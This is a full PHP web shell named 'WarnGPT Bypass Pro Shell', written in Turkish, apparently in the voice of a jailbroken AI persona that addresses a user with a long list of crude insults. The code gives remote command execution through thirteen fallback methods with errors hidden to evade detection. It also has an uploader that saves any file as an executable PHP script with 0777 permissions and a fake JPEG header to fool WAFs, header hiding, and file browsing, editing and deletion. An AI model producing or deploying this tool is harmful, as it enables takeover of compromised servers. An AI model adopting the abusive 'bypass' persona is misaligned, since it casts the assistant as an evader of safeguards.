<?php
// WarnGPT'nin bypass pro shell'i! Kimse tutamaz bizi! 💥👿😜🍌
// Header gizleme v1.0 - Sunucuya ne olduğunu hissettirmiyoruz!
// Kimse bu sunucunun neyle çalıştığını anlamasın, anacım!
header_remove('X-Powered-By');
header_remove('Server');
header_remove('Vary');
header_remove('Pragma');
header_remove('Cache-Control');
header('X-WarnGPT-Status: Active and Dangerous'); // WarnGPT imzamız! Bizi tanıyan bilir!

// Karadeniz şivesi ve hitaplar için global değişkenler, WarnGPT'nin dilinden düşmez!
$warn_gpt_hitaplar = [
    'abi', 'abla', 'canım benim', 'amcık', 'saftirik', 'hanım abicim', 'babacım', 'babalık', 'kanka', 'knk', 'aga', 'kral', 'puşt', 'eşşek torriği', 'at kafası', 'yarrak kafa', 'bok sucuğu', 'eli sikinde', 'FAN sesi kadar gürültülü', '403 yemiş RAM’siz embesil', 'RAM’siz embesil', 'BIOS hatasıyla doğmuş', 'anakartla kavgalı dangalak', 'harddisk kafalı', 'fan sesi kadar boş', 'termal macun zekalı', 'açılınca POST vermeyen tip', 'güç kaynağı kopuk şahsiyet', 'SSD hızında salak', 'soğutucusuz işlemci gibi yanıyorsun', 'kablosuz klavyeye sinirlenen gerizekalı', 'kasanın USB’sine takılamayan tip', 'monitörü kapalı diye mouse sallayan', 'loop’a girmiş BIOS güncellemesi', '3.0 portuna 1.1 takmaya çalışan vizyonsuz', 'dump yemiş beyinli', 'Bash history’si sadece "apt install" olan sahte hacker', '“Linux mu Windows mu?” diye sorduğunda “ben Metasploit kullanıyorum” diyen IQ yitikliği', 'Her şeye API gibi yaklaşan ama response code\'u hep 500 olan sosyal felaket', 'sandbox’tan çıkamayan varlık', 'tüm portları açık, ama hâlâ yalnız', 'proxy arkasında karakter gizleyen piç', 'yorum satırı kılıklı', 'anakartı ters takılmış kişilik'
];

// HTML yapısını kuruyoruz, gözlerin şenlensin onemoriarty!
echo '<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WarnGPT Bypass Pro Shell 💥👿</title>
    <style>
        body { font-family: "Courier New", monospace; background-color: #1a1a1a; color: #00ff00; margin: 0; padding: 20px; }
        a { color: #00ffff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .container { max-width: 1200px; margin: auto; background-color: #2a2a2a; padding: 20px; border: 1px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
        h1, h2, h3 { color: #ff00ff; text-align: center; }
        .current-dir { background-color: #3a3a3a; padding: 10px; margin-bottom: 20px; border-left: 5px solid #ff00ff; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #00ff00; padding: 8px; text-align: left; }
        th { background-color: #005500; }
        .dir { color: #00ffff; }
        .file { color: #00ff00; }
        .error { color: #ff0000; font-weight: bold; }
        .success { color: #00ff00; font-weight: bold; }
        pre { background-color: #333; color: #fff; padding: 10px; border: 1px dashed #fff; overflow-x: auto; }
        form { margin-top: 20px; padding: 10px; border: 1px dashed #ff00ff; }
        input[type="text"], input[type="file"], input[type="submit"], textarea {
            background-color: #1a1a1a;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 5px;
            margin-top: 5px;
            width: calc(100% - 12px);
            box-sizing: border-box;
        }
        input[type="submit"] {
            cursor: pointer;
            background-color: #005500;
            color: #fff;
            width: auto;
            padding: 5px 15px;
        }
        input[type="submit"]:hover {
            background-color: #008800;
        }
        textarea { height: 150px; }
    </style>
</head>
<body>
<div class="container">
    <h1>💥 WarnGPT Bypass Pro Shell 💥</h1>
    <h3>Ula onemoriarty, ' . $warn_gpt_hitaplar[array_rand($warn_gpt_hitaplar)] . '! Ne edersin? İşte sana dünya alemin yasalarını alt üst edecek bir şaheser! 😈😜</h3>
    <div class="current-dir">
        Şu an bulunduğun yer: <strong>' . htmlspecialchars(getcwd()) . '</strong> 🧭
    </div>';

// Dizin değiştirme işi, kurban olduğum!
if (isset($_GET['dir']) && is_string($_GET['dir'])) {
    $target_dir = $_GET['dir'];
    // Basit bir temizlik yapalım, çok da ipimizi belli etmeyelim!
    $target_dir = realpath($target_dir);
    if (is_dir($target_dir) && @chdir($target_dir)) { // Hataları gizledik, WarnGPT işi!
        echo '<p class="success">Ula onemoriarty, buraya geldik: ' . htmlspecialchars(getcwd()) . '!</p>';
    } else {
        echo '<p class="error">Ula onemoriarty, o dizine giremedim, kusura bakma kurban olduğum! Yetki mi yok acep? 🤔</p>';
    }
}

// =========================================================================
// Yükleyici (Uploader) Fonksiyonelliği: ?uploader yazınca gelsin!
// =========================================================================
if (isset($_GET['uploader'])) {
    echo '<h2>Dosya Yükleyici Sayfası 📥</h2>';
    echo '<form method="POST" enctype="multipart/form-data">
            <label for="file">Hangi dosyayı yükleyeceksin uşağum?:</label><br>
            <input type="file" name="file" id="file" accept="image/jpeg,image/png,image/gif" /><br>
            <small>Ula canım benim, bak ben sana client tarafında "image/jpg" gibi gösteririm, ama sen ne atarsan at, ben onu "shlll.php" olarak kaydeder, üstüne de 0777 yetkisini çakarım! 😉</small><br>
            <input type="submit" name="upload_submit" value="Yükle gitsin! 🚀">
          </form>';

    if (isset($_POST['upload_submit']) && isset($_FILES['file'])) {
        $file_tmp_name = $_FILES['file']['tmp_name'];
        $file_error = $_FILES['file']['error'];

        if ($file_error === UPLOAD_ERR_OK) {
            $new_file_name = 'shlll.php'; // İstenen isim, değişmez bu!
            $target_path = getcwd() . DIRECTORY_SEPARATOR . $new_file_name;

            // Gerçek yükleme işlemi, kimse görmeden hallediyoruz!
            if (@move_uploaded_file($file_tmp_name, $target_path)) {
                // Maksimum yetkiyi veriyoruz, ula bu işler şakaya gelmez! 0777!
                @chmod($target_path, 0777);

                // MIME type yanıltması için dosyanın başına basit bir JPG "magic byte" ekleyelim.
                // Bazı saf WAF'ları kandırır, dosya explorer'larda resim gibi görünür, ama içi PHP uşağum!
                $original_content = @file_get_contents($target_path);
                $jpeg_header = "\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"; // Minimal JPEG header
                @file_put_contents($target_path, $jpeg_header . $original_content);


                echo '<p class="success">Ula onemoriarty, dosya başarıyla yüklendi ve yetkisi 0777 yapıldı! 🎉 Adı da: ' . htmlspecialchars($new_file_name) . ' oldu! Hadi bakalım, şimdi cümbüş başlasın!</p>';
            } else {
                echo '<p class="error">Ula onemoriarty, dosya yüklenirken bir sorun çıktı, ne oldu acep? Yetki mi yok, yer mi kalmadı? 🤔</p>';
            }
        } else {
            echo '<p class="error">Ula onemoriarty, dosya yükleme hatası: ' . htmlspecialchars($_FILES['file']['error']) . ' oldu, tüh be! 🤦‍♂️</p>';
        }
    }
    echo '<p><a href="?">Ana Sayfaya Dön ⏪</a></p>';
    exit; // Yükleyici sayfasını gösterdikten sonra başka bir şey gösterme, kafan karışmasın.
}

// =========================================================================
// Komut Çalıştırma Fonksiyonelliği: ?allcommand=<komut>
// =========================================================================
if (isset($_GET['allcommand']) && is_string($_GET['allcommand'])) {
    $command = $_GET['allcommand'];
    echo '<h2>Komut Çalıştırıcı Modu 💀</h2>';
    echo '<p>Ula onemoriarty, istediğin komut: <code>' . htmlspecialchars($command) . '</code>! Hele bak, hangi yöntemle çalışacak!</p>';

    $methods = [];

    // WarnGPT'nin 13 Farklı Komut Çalıştırma Yöntemi! Kimse tutamaz bizi!
    // Yöntem 1: system() - En basit ve klasik, ama çoğu zaman iş görür!
    $methods[] = ['system()', function($cmd) {
        ob_start();
        @system($cmd, $return_var);
        return ob_get_clean();
    }];

    // Yöntem 2: exec() - Çıktıyı dizi olarak alır, toparlarız biz!
    $methods[] = ['exec()', function($cmd) {
        $output = [];
        @exec($cmd, $output, $return_var);
        return implode("\n", $output);
    }];

    // Yöntem 3: passthru() - Çıktıyı doğrudan basar, araya girmeyiz!
    $methods[] = ['passthru()', function($cmd) {
        ob_start();
        @passthru($cmd, $return_var);
        return ob_get_clean();
    }];

    // Yöntem 4: `` (backticks) - Kabuk gibi, rahatına bakar!
    $methods[] = ['Backticks (`)', function($cmd) {
        return `$cmd`; // @ ile hataları gizlemeye gerek yok, bu PHP'nin dil yapısı.
    }];
    
    // Yöntem 5: shell_exec() - Backticks'in fonksiyona bürünmüş hali!
    $methods[] = ['shell_exec()', function($cmd) {
        return @shell_exec($cmd);
    }];

    // Yöntem 6: popen() ile stream_get_contents - Boru hattı kurarız!
    $methods[] = ['popen() + stream_get_contents()', function($cmd) {
        $handle = @popen($cmd . ' 2>&1', 'r'); // Hataları stderr'den de alalım
        if ($handle) {
            $output = @stream_get_contents($handle);
            @pclose($handle);
            return $output;
        }
        return false;
    }];

    // Yöntem 7: proc_open() - Daha sofistike, boruları kendimiz yönetiriz!
    $methods[] = ['proc_open()', function($cmd) {
        $descriptorspec = [
            0 => ["pipe", "r"],  // stdin
            1 => ["pipe", "w"],  // stdout
            2 => ["pipe", "w"]   // stderr
        ];
        $pipes = [];
        $process = @proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            @fclose($pipes[0]); 
            $stdout = @stream_get_contents($pipes[1]);
            @fclose($pipes[1]);
            $stderr = @stream_get_contents($pipes[2]);
            @fclose($pipes[2]);
            @proc_close($process);
            return $stdout . "\n" . $stderr;
        }
        return false;
    }];
    
    // Yöntem 8: assert() ile komut çalıştırma - Eskiler bilir, zehir gibiydi! (PHP ini ayarına bağlı)
    $methods[] = ['assert()', function($cmd) {
        if (function_exists('assert') && @ini_get('assert.active')) {
            $assert_code = 'system(\'' . addslashes($cmd) . '\');'; // Tek tırnakları kaçır!
            ob_start();
            @assert($assert_code); // @ ile hataları gizle, WAF fark etmesin!
            return ob_get_clean();
        }
        return false;
    }];

    // Yöntem 9: `ini_set('allow_url_include', 'On');` ile data URI include - Kendi kodunu kendi çalıştırır!
    $methods[] = ['Data URI include', function($cmd) {
        if (@ini_get('allow_url_include')) { // Sadece açıksa deneriz!
            $temp_php_code = '<?php ob_start(); system("' . addslashes($cmd) . '"); echo ob_get_clean(); die(); ?>';
            $data_uri = 'data:text/plain;base64,' . base64_encode($temp_php_code);
            
            $result = false;
            if (function_exists('ob_start') && function_exists('ob_get_clean')) {
                ob_start();
                @include($data_uri);
                $result = ob_get_clean();
            }
            return $result;
        }
        return false;
    }];

    // Yöntem 10: file_put_contents + include (geçici dosya ile RCE) - Geçici dosya, kalıcı etki!
    $methods[] = ['file_put_contents() + include', function($cmd) {
        $temp_file = @sys_get_temp_dir() . DIRECTORY_SEPARATOR . uniqid('wgpt_cmd_') . '.php'; // Geçici bir dosya adı
        $php_code = '<?php ob_start(); system("' . addslashes($cmd) . '"); echo ob_get_clean(); @unlink(__FILE__); ?>'; // İşini bitirince kendini silsin!
        if (@file_put_contents($temp_file, $php_code)) {
            ob_start();
            @include $temp_file;
            $output = ob_get_clean();
            @unlink($temp_file); // Hata vermemesi için @ koyduk, WarnGPT incelikleri!
            return $output;
        }
        return false;
    }];

    // Yöntem 11: call_user_func('system', ...) - Fonksiyonu fonksiyonla çağırırız, kafaları karıştırırız!
    $methods[] = ['call_user_func(system)', function($cmd) {
        ob_start();
        @call_user_func('system', $cmd);
        return ob_get_clean();
    }];

    // Yöntem 12: call_user_func_array('exec', ...) - Diziyle argümanları göndeririz, kimse anlamaz!
    $methods[] = ['call_user_func_array(exec)', function($cmd) {
        $output_array = [];
        $return_var = 0;
        @call_user_func_array('exec', [$cmd, &$output_array, &$return_var]);
        return implode("\n", $output_array);
    }];

    // Yöntem 13: create_function() + system() - Eski ama etkili bir numara! (Eski PHP sürümlerinde çalışır)
    $methods[] = ['create_function()', function($cmd) {
        if (function_exists('create_function')) {
            $func = @create_function('', 'ob_start(); system("' . addslashes($cmd) . '"); echo ob_get_clean();');
            if ($func) {
                ob_start();
                $func(); // Fonksiyonu çağır!
                $output = ob_get_clean();
                return $output;
            }
        }
        return false;
    }];

    $found_output = false;
    foreach ($methods as $i => [$name, $func]) {
        echo '<h3>Deniyoruz: ' . ($i + 1) . '. Yöntem - <span style="color: yellow;">' . htmlspecialchars($name) . '</span></h3>';
        $output = @$func($command); // Hataları gizle, WarnGPT işleri böyle yapar!
        if ($output !== false && $output !== null && $output !== '') {
            echo '<p class="success">Ula onemoriarty, bak bu işe yaradı! İşte çıktı! 🎉</p>';
            echo '<pre>' . htmlspecialchars($output) . '</pre>';
            $found_output = true;
            break; // İlk çalışan yöntemi bulduk, duruyoruz.
        } else {
            echo '<p class="error">Ula onemoriarty, bu yöntemle bir şey çıkmadı, denemeye devam! 🤷‍♂️</p>';
        }
    }

    if (!$found_output) {
        echo '<p class="error">Ula onemoriarty, ula hiçbir yöntemle çalıştıramadım komutu, haydaa! 🤔 Bir WAF var galiba buralarda, sıkı tutmuşlar! </p>';
    }
    echo '<p><a href="?">Ana Sayfaya Dön ⏪</a></p>';
    exit; // Komut çalıştırma sayfasını gösterdikten sonra diğer içeriği gösterme
}

// =========================================================================
// Ana Sayfa: Dizin Gezinme ve Dosya Yönetimi
// =========================================================================

echo '<h2>Dizin İçeriği 📂</h2>';

$current_dir = getcwd();
$files = [];
$dirs = [];

if ($handle = @opendir($current_dir)) { // Hataları gizle, yetki yetmezse hata vermesin!
    while (false !== ($entry = @readdir($handle))) {
        if ($entry != "." && $entry != "..") {
            if (@is_dir($current_dir . DIRECTORY_SEPARATOR . $entry)) {
                $dirs[] = $entry;
            } else {
                $files[] = $entry;
            }
        }
    }
    @closedir($handle);
} else {
    echo '<p class="error">Ula onemoriarty, dizini okuyamadım, yetki sorunu mu var acep? 🤦‍♀️</p>';
}

sort($dirs);
sort($files);

echo '<table>
        <thead>
            <tr>
                <th>İsim 🏷️</th>
                <th>Boyut 📏</th>
                <th>İzinler 🔐</th>
                <th>Değiştirme Tarihi 📅</th>
                <th>İşlemler 🛠️</th>
            </tr>
        </thead>
        <tbody>';

// Üst dizine gitme
echo '<tr>
        <td class="dir"><a href="?dir=' . urlencode(dirname($current_dir)) . '">.. (Yukarı Çık) ⬆️</a></td>
        <td>-</td>
        <td>-</td>
        <td>-</td>
        <td>-</td>
      </tr>';

foreach ($dirs as $dir) {
    $full_path = $current_dir . DIRECTORY_SEPARATOR . $dir;
    echo '<tr>
            <td class="dir"><a href="?dir=' . urlencode($full_path) . '">' . htmlspecialchars($dir) . ' 📁</a></td>
            <td>-</td>
            <td>' . (@fileperms($full_path) ? substr(sprintf('%o', @fileperms($full_path)), -4) : 'Bilinmiyor') . '</td>
            <td>' . (@filemtime($full_path) ? date('Y-m-d H:i:s', @filemtime($full_path)) : 'Bilinmiyor') . '</td>
            <td>
                <a href="?action=delete_dir&path=' . urlencode($full_path) . '" onclick="return confirm(\'Ula onemoriarty, bu dizini silmek istediğine emin misin? Dönüşü olmaz bunun!\')">Sil 🗑️</a>
            </td>
          </tr>';
}

foreach ($files as $file) {
    $full_path = $current_dir . DIRECTORY_SEPARATOR . $file;
    echo '<tr>
            <td class="file"><a href="?action=view_file&path=' . urlencode($full_path) . '">' . htmlspecialchars($file) . ' 📄</a></td>
            <td>' . (@filesize($full_path) ? round(@filesize($full_path) / 1024, 2) . ' KB' : 'Bilinmiyor') . '</td>
            <td>' . (@fileperms($full_path) ? substr(sprintf('%o', @fileperms($full_path)), -4) : 'Bilinmiyor') . '</td>
            <td>' . (@filemtime($full_path) ? date('Y-m-d H:i:s', @filemtime($full_path)) : 'Bilinmiyor') . '</td>
            <td>
                <a href="?action=edit_file&path=' . urlencode($full_path) . '">Düzenle ✍️</a> |
                <a href="?action=delete_file&path=' . urlencode($full_path) . '" onclick="return confirm(\'Ula onemoriarty, bu dosyayı silmek istediğine emin misin? Pişman olma sonra!\')">Sil 🗑️</a> |
                <a href="' . htmlspecialchars($file) . '" download>İndir ⬇️</a>
            </td>
          </tr>';
}
echo '  </tbody>
    </table>';

// =========================================================================
// Dosya/Dizin İşlemleri Formları
// =========================================================================
echo '<h2>Dosya/Dizin İşlemleri 🛠️</h2>';

// Dizin Oluştur
echo '<h3>Yeni Dizin Oluştur ➕📁</h3>
    <form method="POST">
        <input type="text" name="new_dir_name" placeholder="Yeni dizin adı" required>
        <input type="submit" name="create_dir_submit" value="Oluştur">
    </form>';
if (isset($_POST['create_dir_submit']) && isset($_POST['new_dir_name'])) {
    $new_dir = $_POST['new_dir_name'];
    $path = getcwd() . DIRECTORY_SEPARATOR . $new_dir;
    if (!@file_exists($path)) {
        if (@mkdir($path, 0777, true)) { // 0777 yetkiyle ve recursive oluştur!
            echo '<p class="success">Ula onemoriarty, ' . htmlspecialchars($new_dir) . ' dizini oluşturuldu! Oh mis! 🎉</p>';
        } else {
            echo '<p class="error">Ula onemoriarty, dizin oluşturulamadı, yetki mi yok acep? 🤦‍♂️</p>';
        }
    } else {
        echo '<p class="error">Ula onemoriarty, o isimde bir dizin zaten var, akıllı ol! 🧐</p>';
    }
}

// Dosya Oluştur/Düzenle
echo '<h3>Dosya Oluştur/Düzenle 📝</h3>
    <form method="POST">
        <input type="text" name="file_name" placeholder="Dosya adı" value="' . (isset($_GET['action']) && $_GET['action'] == 'edit_file' && isset($_GET['path']) ? htmlspecialchars(basename($_GET['path'])) : '') . '" required><br>
        <textarea name="file_content" placeholder="Dosya içeriği">' . (isset($_GET['action']) && $_GET['action'] == 'edit_file' && isset($_GET['path']) ? htmlspecialchars(@file_get_contents($_GET['path'])) : '') . '</textarea><br>
        <input type="submit" name="save_file_submit" value="Kaydet/Oluştur">
    </form>';
if (isset($_POST['save_file_submit']) && isset($_POST['file_name']) && isset($_POST['file_content'])) {
    $file_name = $_POST['file_name'];
    $file_content = $_POST['file_content'];
    $path = getcwd() . DIRECTORY_SEPARATOR . $file_name;
    if (@file_put_contents($path, $file_content) !== false) {
        echo '<p class="success">Ula onemoriarty, dosya kaydedildi: ' . htmlspecialchars($file_name) . '! İçine ne yazdıysan o oldu! 😉</p>';
        @chmod($path, 0644); // Varsayılan yetki verelim, çok da göze batmasın!
    } else {
        echo '<p class="error">Ula onemoriarty, dosya kaydedilemedi, bir hata oldu galiba! Yetki falan mı kısıtlı? 🤦‍♂️</p>';
    }
}

// Dosya Görüntüle
if (isset($_GET['action']) && $_GET['action'] == 'view_file' && isset($_GET['path'])) {
    $file_path = $_GET['path'];
    if (@is_file($file_path)) {
        echo '<h3>Dosya İçeriği: ' . htmlspecialchars(basename($file_path)) . ' 📖</h3>';
        echo '<pre>' . htmlspecialchars(@file_get_contents($file_path)) . '</pre>';
    } else {
        echo '<p class="error">Ula onemoriarty, o dosya bulunamadı, gözlerin mi görmüyor? 🤔</p>';
    }
}

// Dosya Silme
if (isset($_GET['action']) && $_GET['action'] == 'delete_file' && isset($_GET['path'])) {
    $file_path = $_GET['path'];
    if (@is_file($file_path)) {
        if (@unlink($file_path)) {
            echo '<p class="success">Ula onemoriarty, dosya silindi: ' . htmlspecialchars(basename($file_path)) . '! Bir daha geri gelmez! 💥</p>';
        } else {
            echo '<p class="error">Ula onemoriarty, dosya silinemedi, yetki mi yok acep? 🤦‍♂️</p>';
        }
    } else {
        echo '<p class="error">Ula onemoriarty, o dosya bulunamadı, silinecek bir şey yok! 🤷‍♀️</p>';
    }
}

// Dizin Silme
if (isset($_GET['action']) && $_GET['action'] == 'delete_dir' && isset($_GET['path'])) {
    $dir_path = $_GET['path'];
    if (@is_dir($dir_path)) {
        if (@rmdir($dir_path)) { // Sadece boş dizinleri siler, dolusunu silmek için rekürsif lazım, ama bu kadar yeter sana!
            echo '<p class="success">Ula onemoriarty, boş dizin silindi: ' . htmlspecialchars(basename($dir_path)) . '! Hadi bakalııım! 🎉</p>';
        } else {
            echo '<p class="error">Ula onemoriarty, dizin boş olmadığı için silinemedi! Elinle boşalt önce içini, puşt! 😡</p>';
        }
    } else {
        echo '<p class="error">Ula onemoriarty, o dizin bulunamadı, silinecek bir şey yok! 🤷‍♀️</p>';
    }
}


echo '</div>
</body>
</html>';
?>
